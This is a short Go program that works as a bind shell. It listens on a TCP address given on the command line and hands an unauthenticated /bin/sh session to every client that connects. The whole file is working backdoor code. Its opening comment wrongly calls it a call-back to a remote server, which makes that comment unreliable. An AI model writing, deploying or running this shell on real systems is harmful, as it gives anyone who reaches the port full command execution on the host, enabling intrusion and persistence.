// Call back to a remote server and open a shell session
package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

var shell = "/bin/sh"

func main() {
	// Handle command line arguments
	if len(os.Args) != 2 {
		fmt.Println("Usage: " + os.Args[0] + " <bindAddress>")
		fmt.Println("Example: " + os.Args[0] + " 0.0.0.0:9999")
		os.Exit(1)
	}

	// Bind socket
	listener, err := net.Listen("tcp", os.Args[1])
	if err != nil {
		log.Fatal("Error connecting. ", err)
	}
	log.Println("Now listening for connections.")

	// Listen and serve shells forever
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Error accepting connection. ", err)
		}
		go handleConnection(conn)
	}

}

// This function gets executed in a thread for each incoming connection
func handleConnection(conn net.Conn) {
	log.Printf("Connection received from %s. Opening shell.", conn.RemoteAddr())
	conn.Write([]byte("Connection established. Opening shell.\n"))

	// Use the reader/writer interface to connect the pipes
	command := exec.Command(shell)
	command.Stdin = conn
	command.Stdout = conn
	command.Stderr = conn
	command.Run()

	log.Printf("Shell ended for %s", conn.RemoteAddr())
}
